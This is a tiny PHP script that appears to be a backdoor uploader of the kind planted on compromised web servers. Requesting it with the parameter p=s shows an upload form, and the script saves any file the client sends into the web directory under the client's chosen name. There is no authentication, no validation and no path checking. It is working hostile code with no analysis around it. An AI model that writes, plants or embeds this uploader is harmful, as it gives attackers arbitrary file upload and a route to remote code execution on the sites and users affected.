<?php

$Iraqe  = $_GET['p'];

if($Iraqe == 's'){

$filename = $_FILES['file']['name'];
$filetmp  = $_FILES['file']['tmp_name'];

echo "<form method='POST' enctype='multipart/form-data'>
	<input type='file'name='file' />
	<input type='submit' value='go' />

</form>";

if(move_uploaded_file($filetmp,$filename)=='1'){
echo 'done ----> '.$filename;
} 
}
?>
